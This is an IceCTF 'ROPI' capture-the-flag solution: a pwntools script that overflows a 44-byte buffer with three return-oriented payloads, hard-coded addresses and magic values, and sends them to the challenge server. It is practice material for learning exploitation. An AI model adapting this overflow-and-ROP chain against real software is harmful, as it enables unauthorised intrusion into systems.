#!/usr/bin/python

# @nullp0inter
# IceCTF ROPI

from pwn import *

# Addresses
main        = 0x08048661
ezy_addr    = 0x0804852d
ret_addr    = 0x08048569
ret_can     = 0xbadbeeef
ori_addr    = 0x080485c4
ori_can1    = 0xabcdefff
ori_can2    = 0x78563412
pro_addr    = 0x0804862c

# Payload Generation
payload      = 'A'*44
payload     += p32(ret_addr)
payload     += p32(ezy_addr)
payload     += p32(ret_can)
payload2     = 'A'*44
payload2    += p32(ori_addr)
payload2    += p32(ezy_addr)
payload2    += p32(ori_can1)
payload2    += p32(ori_can2)
payload3     = 'A'*44
payload3    += p32(pro_addr)
payload3    += p32(main)

# Start Pwnage
p = remote('ropi.vuln.icec.tf',6500) # Remote
#p = process('./ropi') # local

p.recv()
p.sendline(payload)
p.recv()
p.sendline(payload2)
p.recv()
p.sendline(payload3)
p.interactive()
